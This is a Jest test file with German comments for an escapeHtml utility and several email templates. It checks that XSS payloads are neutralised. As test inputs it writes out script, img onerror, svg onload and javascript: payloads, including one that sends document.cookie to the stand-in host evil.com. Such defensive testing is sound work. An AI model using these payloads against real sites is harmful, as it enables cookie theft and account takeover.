/**
 * @fileoverview Tests für escapeHtml Utility
 * Stellt sicher, dass alle HTML-Sonderzeichen korrekt escaped werden
 * und XSS-Angriffe über E-Mail-Templates verhindert werden.
 */

const { escapeHtml } = require('../../src/utils/escapeHtml');

describe('escapeHtml', () => {
  // ============================================
  // Grundlegende Funktionalität
  // ============================================

  it('should return empty string for falsy values', () => {
    expect(escapeHtml('')).toBe('');
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(0)).toBe('');   // 0 ist falsy → leer (gewollt für Templates)
    expect(escapeHtml(false)).toBe(''); // false ist falsy → leer
  });

  it('should pass through safe strings unchanged', () => {
    expect(escapeHtml('Hello World')).toBe('Hello World');
    expect(escapeHtml('Youssef Dawod')).toBe('Youssef Dawod');
    expect(escapeHtml('Max Müller')).toBe('Max Müller');
    expect(escapeHtml('مرحبا')).toBe('مرحبا');
    expect(escapeHtml('გამარჯობა')).toBe('გამარჯობა');
  });

  it('should convert numbers to string', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(3.14)).toBe('3.14');
  });

  // ============================================
  // HTML-Sonderzeichen
  // ============================================

  it('should escape ampersand', () => {
    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
  });

  it('should escape less-than', () => {
    expect(escapeHtml('a < b')).toBe('a &lt; b');
  });

  it('should escape greater-than', () => {
    expect(escapeHtml('a > b')).toBe('a &gt; b');
  });

  it('should escape double quotes', () => {
    expect(escapeHtml('say "hello"')).toBe('say &quot;hello&quot;');
  });

  it('should escape single quotes', () => {
    expect(escapeHtml("it's")).toBe('it&#39;s');
  });

  // ============================================
  // XSS-Angriffsvektoren
  // ============================================

  it('should neutralize script injection', () => {
    const xss = '<script>alert("XSS")</script>';
    const result = escapeHtml(xss);
    expect(result).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    expect(result).not.toContain('<script>');
  });

  it('should neutralize img onerror injection', () => {
    const xss = '<img src=x onerror=fetch("https://evil.com/steal?c="+document.cookie)>';
    const result = escapeHtml(xss);
    expect(result).not.toContain('<img');
    // 'onerror' als reiner Text ist harmlos — ohne <img> entsteht kein HTML-Element
    expect(result).toContain('&lt;img');
  });

  it('should neutralize event handler injection', () => {
    const xss = '<div onmouseover="alert(1)">hover me</div>';
    const result = escapeHtml(xss);
    expect(result).not.toContain('<div');
    // 'onmouseover' als reiner Text ohne HTML-Element ist harmlos
    expect(result).toContain('&lt;div');
  });

  it('should neutralize SVG injection', () => {
    const xss = '<svg/onload=alert(1)>';
    const result = escapeHtml(xss);
    expect(result).not.toContain('<svg');
  });

  it('should neutralize href javascript: injection', () => {
    const xss = '<a href="javascript:alert(1)">click</a>';
    const result = escapeHtml(xss);
    expect(result).not.toContain('<a ');
    // 'javascript:' als reiner Text ohne <a>-Element ist harmlos
    expect(result).toContain('&lt;a');
  });

  // ============================================
  // Kombinationen
  // ============================================

  it('should escape multiple special characters in one string', () => {
    const input = 'Tom & <b>Jerry</b> say "hi" & it\'s fine';
    const result = escapeHtml(input);
    expect(result).toBe(
      'Tom &amp; &lt;b&gt;Jerry&lt;/b&gt; say &quot;hi&quot; &amp; it&#39;s fine'
    );
  });

  it('should handle realistic malicious username', () => {
    const maliciousName = '"><img src=x onerror=fetch("https://evil.com")>';
    const result = escapeHtml(maliciousName);
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result).not.toContain('"');
  });
});

// ============================================
// Integration: Templates nutzen escapeHtml korrekt
// ============================================

describe('Email Template XSS Protection (Integration)', () => {
  const { verification, emailChange } = require('../../src/utils/emailTemplates/authTemplates');
  const { passwordReset } = require('../../src/utils/emailTemplates/passwordTemplates');
  const { welcome, securityAlert } = require('../../src/utils/emailTemplates/accountTemplates');
  const { newUserRegistration } = require('../../src/utils/emailTemplates/adminTemplates');
  const { transactionNotification } = require('../../src/utils/emailTemplates/financialTemplates');

  const MALICIOUS_NAME = '<script>alert("XSS")</script>';
  const MALICIOUS_EMAIL = '"><img src=x onerror=steal()>';

  it('verification template should escape name', () => {
    const html = verification(MALICIOUS_NAME, 'https://example.com/verify');
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('emailChange template should escape name and email', () => {
    const html = emailChange(MALICIOUS_NAME, 'https://example.com/verify', MALICIOUS_EMAIL);
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;script&gt;');
  });

  it('passwordReset template should escape name', () => {
    const html = passwordReset(MALICIOUS_NAME, 'https://example.com/reset');
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('welcome template should escape name', () => {
    const html = welcome(MALICIOUS_NAME);
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('securityAlert template should escape name and details', () => {
    const html = securityAlert(MALICIOUS_NAME, 'login', {
      ip: '<script>alert(1)</script>',
      userAgent: '<img src=x onerror=steal()>',
      location: '"><svg/onload=alert(1)>',
    });
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('<img');
    // baseLayout contains a legitimate inline SVG logo, so check that the
    // malicious onload payload was escaped rather than blocking all <svg> tags
    expect(html).not.toContain('<svg/onload');
  });

  it('newUserRegistration template should escape all fields', () => {
    const html = newUserRegistration({
      adminName: MALICIOUS_NAME,
      userName: MALICIOUS_NAME,
      userEmail: MALICIOUS_EMAIL,
      registeredAt: '2026-02-26',
    });
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('<img');
  });

  it('transactionNotification template should escape name and transaction fields', () => {
    const html = transactionNotification(MALICIOUS_NAME, {
      type: 'expense',
      amount: 42.5,
      date: '2026-02-26',
      category: '<script>alert("cat")</script>',
      description: '<img src=x onerror=steal()>',
    });
    expect(html).not.toContain('<script>alert("cat")');
    expect(html).not.toContain('<img src=x');
  });
});
